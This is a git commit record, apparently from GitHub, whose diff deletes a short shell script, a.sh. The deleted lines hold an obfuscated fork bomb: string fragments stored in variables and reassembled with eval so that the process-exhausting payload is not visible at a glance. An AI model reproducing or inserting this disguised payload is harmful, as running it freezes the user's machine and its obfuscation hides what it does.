1e0e8f6d4ee8d8988d0d9eef36793697b08edce0
assz460 <72510623+assz460@users.noreply.github.com>
2021-06-18 14:33:26 +0300

    Delete a.sh

--- a.sh
+++
@@ -1,3 +0,0 @@
-z="
-";Bz='{ :|';Dz=';:';Cz=':& }';Az=':() ';
-eval "$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz$z$Az$Bz$Cz$Dz"
